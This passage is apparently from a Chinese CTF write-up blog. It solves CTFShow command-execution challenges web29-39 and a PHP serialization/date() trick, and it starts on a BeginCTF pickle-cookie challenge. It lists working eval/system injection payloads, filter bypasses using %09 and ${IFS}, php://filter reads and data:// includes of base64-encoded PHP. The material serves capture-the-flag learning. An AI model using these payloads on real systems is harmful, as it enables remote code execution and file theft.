class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-number">12</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-string">&#x27;12&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> &amp;&amp;<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-number">12</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;12&#x27;</span>))&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;no no no~&#x27;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-comment">//结果：</span><br>ok<br><span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;7b52009b64fd0a2a49e6d8a939753077792b0554&quot;</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">40</span>) <span class="hljs-string">&quot;7b52009b64fd0a2a49e6d8a939753077792b0554&quot;</span><br></code></pre></td></tr></table></figure><p>然后对<code>file</code>变量调用了<code>date</code>函数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br></code></pre></td></tr></table></figure><p>这东西可以用来转义，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;/flag&quot;</span>);<br><span class="hljs-keyword">echo</span><span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;/f\l\a\g&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果:</span><br>/fSundayam9<br>/flag<br></code></pre></td></tr></table></figure><p>然后是对经过<code>date</code>函数转义后数据的处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>先利用<code>file_put_contents</code>函数把<code>$content</code>放到生成的<code>$uuid</code>文件中，然后利用正则匹配将文件中的空白字符和换行替换为空字符，再赋值给<code>$data</code>。最后利用<code>file_get_contents</code>和<code>echo</code>配合输出。</p><p>所以构造<code>payload</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">date</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span> = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span> = <span class="hljs-string">&#x27;1&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;/f\l\a\g&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">date</span>();<br><span class="hljs-variable">$d</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$c</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$d</span>);<br></code></pre></td></tr></table></figure><p>最后是这几个<code>file_get_contents</code>和<code>file_get_contenes</code>的组合使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-variable">$this</span>-&gt;file);<br>            <span class="hljs-variable">$uuid</span>=<span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$uuid</span>,<span class="hljs-variable">$content</span>);<br>            <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/((\s)*(\n)+(\s)*)/i&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$uuid</span>));<br>            <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$data</span>);<br></code></pre></td></tr></table></figure><p>首先<code>$content</code>成了<code>/flag</code>，然后file_put_contents把&#x2F;<code>flag</code>这个字符串写到目标文件里，然后<code>file_get_contents($uuid)</code>这东西把文件内容赋值给<code>$data</code>，这时<code>$data</code>成了<code>/flag</code>。最后再利用一个<code>file_get_contents</code>去读<code>/flag</code>的内容。</p><h2 id="CTFShow命令执行-web29-39"><a href="#CTFShow命令执行-web29-39" class="headerlink" title="[CTFShow命令执行]web29-39"></a>[CTFShow命令执行]web29-39</h2><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>关键字过滤，直接读<code>fla*</code>就行：</p><p><code>/?c=system(&#39;cat fla*&#39;);</code></p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>关键字过滤，<code>system</code>不能用了：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?c=<span class="hljs-keyword">eval</span>($_GET[<span class="hljs-string">&#x27;v&#x27;</span>]);&amp;v=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><p>看其它师傅还可以用<code>nl</code>命令搭配反引号：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">?c=echo `nl fla*`;<br></code></pre></td></tr></table></figure><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>在上题基础上过滤了几个常见的读文件内容的命令，以及<code>.</code>、<code>空格</code>、<code>&#39;</code>。</p><p>小数点这东西过不过滤都无所谓，直接<code>fla*</code>代替<code>flag.php</code>就行，空格倒是有很多绕过方法：<code>%09</code>，<code>$&#123;IFS&#125;</code>，<code>$IFS$9</code>等等。。单引号过滤没啥影响。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/?<span class="hljs-keyword">c</span><span class="hljs-operator">=</span>echo<span class="hljs-variable">%09</span>`tac<span class="hljs-variable">%09</span>fla*`<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>也有其他方法：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">/?c=<span class="hljs-keyword">eval</span>($_GET[v]);&amp;v=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>在上一题的基础上过滤了<code>echo</code>，<code>;</code>，<code>(</code>和反引号：</p><p><a href="https://blog.csdn.net/solitudi/article/details/109837640">参考资料</a>:</p><p>include可以不用括号，分号可以用?&gt;代替。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ruby">c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-<br>encode/resource=flag.php<br>c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?p</span>hp system(<span class="hljs-string">&quot;cat flag.php&quot;</span>);<span class="hljs-string">?&gt;</span><br>c=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>;base64,<span class="hljs-title class_">PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs</span>/<span class="hljs-title class_">Pg</span>==<br></code></pre></td></tr></table></figure><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>比前面多了个<code>&quot;</code>，直接用上一题的<code>payload</code>就好：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">c</span>=include$_GET[1]?&gt;&amp;<span class="hljs-attribute">1</span>=php://filter/read=convert.base64-<br>encode/<span class="hljs-attribute">resource</span>=flag.php<br></code></pre></td></tr></table></figure><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>比上一题多了个<code>:</code>，同样的解法：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web35"><a href="#web35" class="headerlink" title="web35"></a>web35</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>    <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>在前面的基础上过滤了<code>=</code>和<code>&lt;</code>，还是用上题的解法：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]<span class="hljs-string">?&gt;</span>&amp;<span class="hljs-number">1</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h3><p>过滤了数字，把之前的方法数字换成字母就行：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/<span class="hljs-string">?c</span>=<span class="hljs-keyword">include</span><span class="hljs-variable">$_GET</span>[z]<span class="hljs-string">?&gt;</span>&amp;z=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/read</span>=convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure><p>文件包含，利用<code>data</code>伪协议去执行命令<code>&lt;?php system(&quot;cat flag.php&quot;);?&gt;</code>，过滤了<code>flag</code>就编码一下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?c=data:/</span><span class="hljs-regexp">/text/</span>plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<br></code></pre></td></tr></table></figure><h3 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|php|file/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    <br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>增加过滤了<code>php</code>和<code>file</code>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/?c=data:/</span><span class="hljs-regexp">/text/</span>plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<br></code></pre></td></tr></table></figure><h3 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//flag in flag.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>        <br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br></code></pre></td></tr></table></figure><p>加了个<code>.php</code>的后缀，查了一下加后缀不会影响伪协议中php代码的执行(已经闭合了)。</p><h4 id=""><a href="#" class="headerlink" title=""></a></h4><h2 id="最后一些有思路但卡住了还不知道哪里有问题的题目："><a href="#最后一些有思路但卡住了还不知道哪里有问题的题目：" class="headerlink" title="最后一些有思路但卡住了还不知道哪里有问题的题目："></a>最后一些有思路但卡住了还不知道哪里有问题的题目：</h2><p>等官方wp公布后看看自己思路出啥问题了:)</p><h3 id="HGAME-2048-16"><a href="#HGAME-2048-16" class="headerlink" title="[HGAME]2048*16"></a>[HGAME]2048*16</h3><p>游戏题，之前做都是找源码然后里面会存在一些特殊的函数(比如gameover啥的)，但这题没翻到。不过源码存在这么个东西：</p><p><img src="/img/hgamewk12048.png" alt="hgamewk12048"></p><p>翻出两个<code>game-won</code>关键字来，但不知道这东西咋利用。。</p><h3 id="BeginCTF-pickelshop"><a href="#BeginCTF-pickelshop" class="headerlink" title="[BeginCTF]pickelshop"></a>[BeginCTF]pickelshop</h3><p>随便注册个账号：</p><p><img src="/img/beginctfpickle1.png" alt="beginctfpickle1"></p><p><code>Cookie: user=gASVLQAAAAAAAAB9lCiMCHVzZXJuYW1llIwGMTExMTExlIwIcGFzc3dvcmSUjAYxMTExMTGUdS4=</code></p><p>试试能不能解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><br>enc = <span class="hljs-string">&quot;gASVLQAAAAAAAAB9lCiMCHVzZXJuYW1llIwGMTExMTExlIwIcGFzc3dvcmSUjAYxMTExMTGUdS4=&quot;</span><br><span class="hljs-built_in">print</span>(pickle.loads(b64decode(enc)))<br></code></pre></td></tr></table></figure><p>藏了用户名和密码：</p><p><img src="/img/bbeginctf2024pickilestory2.png" alt="bbeginctf2024pickilestory2"></p><p>带着这个<code>cookie</code>可以登录：</p><p><img src="/img/beginctfpickleshop.png" 